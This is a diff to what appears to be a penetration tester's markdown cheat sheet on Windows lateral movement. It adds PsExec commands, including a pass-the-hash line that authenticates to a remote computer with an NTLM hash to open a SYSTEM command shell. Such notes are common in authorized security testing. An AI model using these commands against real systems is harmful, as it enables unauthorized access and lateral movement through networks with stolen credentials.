@@ -51,6 +51,18 @@ runas /netonly /user:<DOMAIN>\<USER> cmd.exe
 runas /netonly /user:<DOMAIN>\<USER> powershell.exe
 ```
 
+#### Psexec
+- if enter-pssession fails:
+```
+.\psexec64.exe \\<COMPUTERNAME
+```
+
+#### Psexec pass the hash
+- Uses an empty hash
+```
+.\psexec64.exe \\<COMPUTERNAME -accepteula -s -u <DOMAIN>\<USER> -p aad3b435b51404eeaad3b435b51404ee:<NTLM HASH> cmd.exe
+```
+
 ## Double hop
 #### Pssession in pssession
 ```
